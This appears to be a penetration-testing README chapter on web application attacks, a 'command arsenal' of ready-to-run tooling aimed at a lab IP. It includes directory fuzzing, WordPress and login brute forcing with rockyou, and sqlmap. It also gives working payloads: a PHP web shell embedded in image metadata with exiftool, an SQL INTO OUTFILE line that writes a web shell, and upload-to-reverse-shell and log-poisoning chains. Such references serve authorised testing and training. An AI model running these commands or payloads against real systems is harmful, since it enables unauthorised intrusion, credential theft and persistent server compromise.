# 03 — Web Application Attacks

## Philosophy

Web applications represent the **largest and most dynamic attack surface** in modern environments. Unlike network services that follow predictable protocols, web applications are **custom-built systems** with complex logic, numerous input vectors, and frequently exposed endpoints.

Successful web exploitation depends on **systematic enumeration, parameter analysis, and understanding application logic** rather than relying solely on automated scanners.

The objective of this phase is to **transform discovered web assets into actionable attack vectors**, ultimately leading to authentication bypass, data exposure, or remote code execution.

---

# Attack Surface Overview

Common attack vectors in web applications include:

**Entry Points**

* URLs and endpoints
* Login forms
* File uploads
* API endpoints
* WebSockets

**Technologies**

* Frameworks: Django, Flask, Rails, Laravel
* CMS: WordPress, Joomla, Drupal
* Languages: PHP, ASP.NET, Node.js, Java

**Authentication Systems**

* Login portals
* Session tokens
* JWT tokens
* OAuth integrations

**Input Vectors**

* GET parameters
* POST parameters
* Cookies
* HTTP headers
* JSON payloads

**Application Logic**

* Payment workflows
* Role-based access control
* File processing
* Multi-step forms

---

# Web Application Testing Workflow

```
Initial Recon
    ↓
Directory & File Enumeration
    ↓
Parameter Discovery
    ↓
Vulnerability Testing
    ↓
Authentication Attacks
    ↓
Post-Exploitation
```

```
Initial Recon
    └─ Technologies, URLs, sitemap

Directory Enumeration
    └─ Hidden endpoints, admin panels, backups

Parameter Fuzzing
    └─ Hidden parameters, injection points

Vulnerability Testing
    ├─ SQL Injection
    ├─ XSS
    ├─ LFI/RFI
    ├─ SSRF
    └─ Command Injection

Authentication Attacks
    └─ Login brute force, session manipulation

Post Exploitation
    └─ Web shell, reverse shell, data exfiltration
```

---

# Command Arsenal

## Directory & File Enumeration

### Gobuster

```bash
gobuster dir \
-u http://192.168.1.10 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-t 50 \
-x php,asp,aspx,txt,html,zip,backup
```

### Dirb

```bash
dirb http://192.168.1.10 \
/usr/share/wordlists/dirb/common.txt \
-X .php,.html,.txt
```

### FFUF (Fast Web Fuzzer)

```bash
ffuf -u http://192.168.1.10/FUZZ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-e .php,.html \
-recursion \
-recursion-depth 2
```

### WFuzz Parameter Discovery

```bash
wfuzz -c \
-z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
--hc 404 \
"http://192.168.1.10/page.php?FUZZ=1"
```

---

# CMS-Specific Enumeration

## WordPress

```bash
wpscan --url http://192.168.1.10 --enumerate vp,vt,u
```

```bash
wpscan \
--url http://192.168.1.10 \
--passwords /usr/share/wordlists/rockyou.txt \
--username admin
```

## Joomla

```bash
joomscan -u http://192.168.1.10
```

```bash
droopescan scan joomla --url http://192.168.1.10
```

## Drupal

```bash
droopescan scan drupal --url http://192.168.1.10
```

---

# Parameter Injection Testing

## SQL Injection

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" \
--batch \
--level 2 \
--risk 2
```

POST Request Testing

```bash
sqlmap \
-u "http://192.168.1.10/login.php" \
--data="user=admin&pass=admin" \
--level 3 \
--risk 3
```

---

## Cross-Site Scripting

```bash
xsstrike \
-u "http://192.168.1.10/page.php?q=test" \
--crawl
```

---

## Local File Inclusion

```bash
ffuf \
-u "http://192.168.1.10/page.php?file=FUZZ" \
-w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

---

# File Upload Testing

Test file upload filters.

Example payload embedding:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

Common bypasses:

* double extensions (`shell.php.jpg`)
* MIME type manipulation
* null byte injection
* polyglot files

---

# Authentication Attacks

## Hydra

```bash
hydra \
-l admin \
-P /usr/share/wordlists/rockyou.txt \
192.168.1.10 \
http-post-form \
"/login.php:user=^USER^&pass=^PASS^:F=Invalid"
```

## Medusa

```bash
medusa \
-h 192.168.1.10 \
-u admin \
-P /usr/share/wordlists/rockyou.txt \
-M http \
-m DIR:/login.php \
-F
```

Manual testing should always be performed using
Burp Suite.

---

# Deep Enumeration Techniques

## JavaScript Endpoint Discovery

```bash
grep -rhoP '"[A-Za-z0-9_/.-]*"' js/ \
| sort -u \
| sed 's/"//g'
```

Using LinkFinder:

```bash
python3 LinkFinder.py \
-i http://192.168.1.10 \
-d
```

---

# API Endpoint Discovery

```bash
ffuf \
-u http://192.168.1.10/api/v1/FUZZ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt
```

```bash
ffuf \
-u http://192.168.1.10/FUZZ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints.txt
```

---

# GraphQL Enumeration

```bash
curl -X POST http://192.168.1.10/graphql \
-H "Content-Type: application/json" \
-d '{"query":"query { __schema { types { name fields { name } } } }"}'
```

---

# Automation Techniques

## Automated Web Scan Script

```bash
#!/bin/bash

TARGET=$1
OUTDIR="web_scan_$(echo $TARGET | tr '/' '_')"

mkdir -p $OUTDIR

echo "[*] Directory enumeration"
gobuster dir -u $TARGET \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-t 50 \
-x php,asp,aspx,txt,html,zip,bak \
-o $OUTDIR/gobuster.txt

echo "[*] Technology detection"
whatweb $TARGET -v > $OUTDIR/whatweb.txt

echo "[*] Vulnerability scanning"
nuclei -u $TARGET \
-t ~/nuclei-templates/ \
-severity critical,high,medium \
-o $OUTDIR/nuclei.txt

echo "[+] Scan complete"
```

---

# Attack Path Identification

| Finding                | Next Step                                     |
| ---------------------- | --------------------------------------------- |
| Admin panel discovered | Attempt credential brute force                |
| SQL injection          | Extract DB data, attempt OS command execution |
| File upload            | Upload web shell                              |
| LFI                    | Read sensitive files, attempt log poisoning   |
| XSS                    | Steal cookies, escalate privileges            |

---

# Common Exploit Chains

### LFI → Log Poisoning → RCE

1. Identify LFI in parameter
2. Inject PHP code into logs
3. Include log file via LFI

---

### SQL Injection → Web Shell

```sql
SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE "/var/www/html/shell.php";
```

---

### File Upload → Reverse Shell

1. Bypass extension filter
2. Upload PHP shell
3. Execute uploaded payload

---

# Common Mistakes

### Ignoring robots.txt

```bash
curl http://192.168.1.10/robots.txt
```

### Not fuzzing parameters

Many vulnerabilities exist in **hidden parameters**.

### Over-reliance on scanners

Automated scanners often miss **business logic vulnerabilities**.

### Ignoring default credentials

Always try:

```
admin:admin
root:root
admin:password
```

---

# Professional Tips

### Use Intruder efficiently

Advanced brute forcing with
Burp Suite.

### Build custom wordlists

Use discovered usernames, company names, and directories.

### Inspect HTML source

Look for developer comments or hidden endpoints.

### Test HTTP methods

```bash
curl -X OPTIONS http://192.168.1.10
```

### Check for IDOR

Manipulate numeric identifiers:

```
/user/123
/user/124
```

---

# Output Organization

```
03-Web-Application-Attacks/

├── README.md
├── targets
│   ├── http-192.168.1.10
│   │   ├── dir_enum.txt
│   │   ├── whatweb.txt
│   │   ├── nuclei.txt
│   │   ├── sqlmap
│   │   ├── burp_state
│   │   └── shells
│   └── wordpress-sites
│
├── findings.csv
└── attack_paths.txt
```
